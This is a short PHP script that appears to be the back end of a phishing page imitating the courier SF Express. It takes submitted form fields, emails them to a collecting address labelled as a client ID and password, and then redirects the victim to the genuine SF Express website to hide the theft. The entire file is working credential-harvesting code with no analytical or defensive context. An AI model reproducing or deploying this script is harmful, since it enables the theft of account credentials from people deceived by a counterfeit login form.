<?php

if(empty($_POST['submit']))
{
	echo "Form is not submitted!";
	exit;
}
if(empty($_POST["fullname"]) ||
	empty($_POST["email"]))
	{
		echo "Please fill the form";
		exit;
	}
	
$name = $_POST["fullname"];
$email = $_POST["email"];

mail( 'user@domain.com' , 'SFE' , 
"Client-ID: $email | Password:$name"  );

header('Location: https://www.sf-express.com/chn/sc');


?>